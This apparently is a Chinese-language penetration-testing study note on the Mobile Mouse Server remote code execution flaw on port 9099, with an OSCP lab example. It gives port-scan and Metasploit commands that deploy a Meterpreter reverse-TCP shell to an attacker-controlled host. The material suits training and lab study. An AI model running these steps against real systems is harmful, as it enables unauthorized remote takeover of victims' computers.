# 💥 Mobile Mouse 服務遠端代碼執行 (mobile-mouse-rce)

本文件說明 Mobile Mouse Server 遠端代碼執行漏洞的成因與利用技巧。

---

## 🔍 漏洞成因與原理

**Mobile Mouse Server** 是一款允許用戶透過行動裝置（如手機）在同一網域內遠端控制電腦滑鼠與鍵盤的軟體，預設運行在 TCP/UDP **9099 端口**。

由於該服務協定在早期版本中沒有實施嚴格的身份驗證或安全封包校驗，服務在接收到特定的協議指令封包時，會直接在作業系統上模擬鍵盤與滑鼠的輸入（如模擬按下 Win + R 並輸入命令運行）。攻擊者只要能夠建立與 9099 端口的 TCP 連線，就能構造特製的控制封包直接輸入並執行任意指令，從而取得遠端代碼執行 (RCE) 權限。

---

## 🛠️ 常見利用與繞過技巧

### 1. 資訊收集與端口識別
*   **檢測 9099 Port 開啟**：
    ```bash
    rustscan -a <TARGET_IP>
    ```
    *若 9099 Port 處於 Open 狀態，多為 Mobile Mouse 服務運行。*

---

### 2. 基本利用方法 (Metasploit)
Metasploit 已內建對應的漏洞利用模組，可以全自動模擬鍵盤輸入反彈 shell：

1.  **進入 MSF 模組**：
    ```bash
    msfconsole -q
    msf > use exploit/windows/misc/mobile_mouse_rce
    ```
2.  **設定利用參數**：
    ```bash
    msf exploit(windows/misc/mobile_mouse_rce) > set rhosts <TARGET_IP>
    msf exploit(windows/misc/mobile_mouse_rce) > set lhost <KALI_IP>
    msf exploit(windows/misc/mobile_mouse_rce) > set payload windows/meterpreter/reverse_tcp
    ```
3.  **執行 Exploit**：
    ```bash
    msf exploit(windows/misc/mobile_mouse_rce) > exploit
    ```
    *MSF 會建立與 9099 連線，並模擬滑鼠與鍵盤輸入，在 Windows Temp 目錄下釋放 payload exe 並執行之，成功回連 Meterpreter 會話。*

---

# 實戰關聯
*   **靶機應用實例**：
    *   [[OSCP-C]]（在針對外網 Windows 成員主機 192.168.x.155 進行 Rustscan 掃描時，發現其開放了 9099 Port。攻擊者透過 MSF 呼叫 `mobile_mouse_rce` 模組，配置好 RHOSTS 與 LHOST 後執行，該模組全自動發送封包模擬 Win+R 鍵盤輸入，使目標執行 payload 並成功回彈 Meterpreter 會話，取得 `oscp\tim` 用戶的初始存取權限）。
